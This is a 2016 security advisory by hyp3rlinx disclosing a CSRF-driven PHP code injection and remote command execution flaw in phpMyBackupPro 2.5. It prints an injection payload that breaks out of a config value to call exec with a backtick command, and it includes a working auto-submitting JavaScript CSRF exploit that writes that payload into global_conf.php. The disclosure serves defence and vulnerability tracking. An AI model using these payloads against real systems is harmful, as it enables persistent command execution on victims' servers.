@@ -1,0 +1,147 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/PHPMYBACKUPPRO-v2.5-RCE.txt
+
+
+Vendor:
+=============================
+www.phpmybackuppro.net
+
+project site:
+sourceforge.net/projects/phpmybackup/
+
+
+Product:
+===========================
+phpMyBackupPro v.2.5 (PMBP)
+
+phpMyBackup Pro is a very easy to use, free, web-based MySQL backup
+application, licensed under the GNU GPL.
+You can create scheduled backups, manage and restore them, download or
+email them and a lot more.
+
+
+Vulnerability Type:
+=========================
+Remote Command Execution / CSRF
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+phpMyBackupPro uses PHP configuration files (global_conf.php) to manage
+settings, allowing user to change things like sql host, language, email
+etc..
+However, a malicious local user can also inject persistent arbitrary PHP/OS
+commands into the configuration to be executed on the host system.
+The remote command execution can also be a result of a CSRF driveby by if
+currently logged admin visits an attackers webpage.
+
+Attackers can inject and write to disk arbitrary PHP code into the
+global_conf.php configuration file if a victim visits a malicious webpage
+or clicks an
+infected link via a CSRF vector or additionally from a local malicious user
+in shared host type environment.
+
+first we escape the single quotes etc... so we can close the expected
+entry, then we leverage the backtick "`" operator to have PHP execute OS
+commands
+on victims system as it works just as well without having to deal with all
+the quote escaping.
+
+e.g. payload that handles the single "'" quote an forward slashes "/"...
+
+''///\\');exec(`c:/\Windows/\system32/\calc.exe`); ///\';
+
+
+The above when injected will result in a write to $CONF variables in
+global_conf.php as follows...
+
+$CONF['lang']=ue('\'\'///\\');exec(`c:/Windows/system32/calc.exe`);
+///\';');
+
+OR...
+
+$CONF['email']=ue('\'\'///\\');exec(`c:/Windows/system32/calc.exe`);
+///\';');
+
+
+Exploit code(s):
+===============
+
+Send admin infected link or convince them to visit our malicious webpage,
+then if the user is logged in and...
+a) clicks our link or visits our evil webpage or
+b) submits the form locally (malicious user) then BOOOOOOOOOOOM!
+
+
+Exploit to run calc.exe on Windows
+
+<script>
+var c=0;
+(function RCE_MAYHEM(){
+c++
+var xhr=new XMLHttpRequest()
+xhr.open('POST','
+http://localhost/phpMyBackupPro-2.5/phpMyBackupPro-2.5/config.php',true)
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.withCredentials = true;
+xhr.send("sitename=localhost&lang=''///\\');exec(`c:/\Windows/\system32/\calc.exe`);
+///\';&sql_host=localhost&sql_user=&sql_passwd=&sql_db=&ftp_server=
+hyp3rlinx.altervista.org
+&ftp_user=hyp3rlinx&ftp_passwd=&ftp_path=&ftp_pasv=1&ftp_port=666&ftp_del=1&email_use=1&email=&submit=Save+data")
+if(c<2){
+RCE_MAYHEM()
+ }
+})()
+</script>
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification:  NR
+February 16, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+=============================================================
+
+Request Method(s):        [+]  POST
+
+
+Vulnerable Product:       [+]  phpMyBackupPro v.2.5 (PMBP)
+
+
+Vulnerable Parameter(s):  [+]  $CONF
+
+============================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
